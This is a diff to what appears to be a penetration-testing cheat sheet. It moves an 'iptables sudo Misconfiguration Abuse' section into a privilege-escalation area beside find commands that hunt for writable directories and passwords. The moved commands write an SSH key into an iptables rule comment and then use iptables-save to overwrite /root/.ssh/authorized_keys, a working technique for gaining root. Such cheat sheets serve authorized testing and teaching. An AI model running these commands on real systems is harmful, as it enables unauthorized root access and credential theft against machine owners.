@@ -775,16 +775,6 @@ echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
 ```
 
-##### iptables
-
-###### sudo Misconfiguration Abuse
-
-```c
-sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n<SSH_KEY>\n'
-sudo iptables -S
-sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
-```
-
 ##### vi
 
 ```c
@@ -5333,6 +5323,16 @@ find / -writable -type d 2>/dev/null
 find / -cmin -60    // find files changed within the last 60 minutes
 find / -amin -60    // find files accesses within the last 60 minutes
 find ./ -type f -exec grep --color=always -i -I 'password' {} \;    // search for passwords
+```
+
+##### iptables
+
+###### sudo Misconfiguration Abuse
+
+```c
+sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n<SSH_KEY>\n'
+sudo iptables -S
+sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
 ```
 
 ##### Kernel Exploits
